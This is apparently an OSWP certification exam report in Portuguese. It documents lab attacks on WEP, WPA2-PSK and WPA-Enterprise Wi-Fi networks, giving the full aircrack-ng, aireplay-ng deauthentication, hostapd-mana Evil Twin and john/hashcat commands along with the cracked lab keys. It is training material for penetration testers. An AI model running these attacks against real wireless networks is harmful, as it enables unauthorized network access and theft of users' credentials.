# 📑 Relatório OSWP – Documentação de Exame

## 1. Metodologia Geral
- **Reconhecimento:** Identificação de redes próximas, coleta de informações de SSID, BSSID, canal e tipo de criptografia.  
- **Captura:** Uso de modo monitor para interceptar pacotes relevantes.  
- **Ataque:** Técnicas específicas para cada tipo de rede (injeção ARP, deauth, Evil Twin).  
- **Quebra:** Processamento dos pacotes capturados para extrair chaves ou credenciais.  
- **Conexão:** Configuração de cliente para autenticação na rede alvo.  
- **Prova:** Demonstração de acesso (ex. download de arquivo `proof.txt`).

---

## 2. Redes WEP
### Passos
1. **Preparação:**  
   ```bash
   iwconfig
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
2. **Captura:**  
   ```bash
   sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wifi-old wlan0mon
   ```
3. **Ataque ARP Replay:**  
   ```bash
   sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
   ```
4. **Quebra da chave:**  
   ```bash
   sudo aircrack-ng wifi-old-01.cap
   ```
   → Chave WEP obtida: `11BB33CD55`
5. **Conexão:**  
   Arquivo `wep.conf` configurado e uso de `wpa_supplicant` + `dhclient`.  
6. **Prova:**  
   ```bash
   curl http://192.168.1.1/proof.txt
   ```

---

## 3. Redes WPA/WPA2‑PSK
### Passos
1. **Captura de Handshake:**  
   ```bash
   sudo airodump-ng wlan0mon --bssid F0:9F:C2:71:22:12 -c 6 -w wifi-mobile
   sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
   ```
2. **Quebra da senha com wordlist:**  
   ```bash
   sudo aircrack-ng wifi-mobile-01.cap -w /usr/share/wordlists/rockyou.txt
   ```
   → Senha obtida: `starwars1`
3. **Conexão:**  
   Arquivo `mobile.conf` configurado com SSID, BSSID e senha.  
   ```bash
   sudo wpa_supplicant -i wlan1 -c mobile.conf
   sudo dhclient wlan1 -v
   ```

---

## 4. Redes WPA‑Enterprise (802.1X/EAP)
### Passos
1. **Reconhecimento e captura:**  
   ```bash
   sudo airodump-ng -c 44 --bssid F0:9F:C2:71:22:15 wlan0mon -w peap_recon
   sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:15 wlan0mon
   ```
2. **Extração de certificados:**  
   ```bash
   tshark -r peap_recon-01.cap -Y "eap && tls.handshake.certificate" -V
   ```
3. **Configuração de Evil Twin (hostapd-mana):**  
   - Certificados gerados com FreeRADIUS.  
   - Arquivo `network.conf` configurado para WPA‑EAP (PEAP/MSCHAPv2).  
   - Execução:  
     ```bash
     sudo hostapd-mana /tmp/network.conf
     ```
4. **Captura de credenciais:**  
   Hash NTLM obtido:  
   ```
   juan.tr:$NETNTLM$... 
   ```
5. **Quebra de senha:**  
   ```bash
   john --wordlist=rockyou.txt john-juan
   hashcat -m 5500 hashcat-juan /usr/share/wordlists/rockyou.txt
   ```
   → Senha obtida: `bulldogs123`
6. **Conexão:**  
   Arquivo `client.conf` configurado com identidade e senha.  
   ```bash
   sudo wpa_supplicant -i wlan4 -c client.conf
   sudo dhclient wlan4 -v
   ```

---

## 5. Conclusão
- **WEP:** Quebra por coleta de IVs e ataque ARP replay.  
- **WPA/WPA2‑PSK:** Captura de handshake e quebra via wordlist.  
- **WPA‑Enterprise:** Evil Twin + MANA WPE para captura de credenciais, quebra de hash NTLM e autenticação.  

📌 Esse relatório demonstra domínio das três metodologias exigidas pelo exame OSWP, com comandos, resultados e provas de acesso documentados.

---
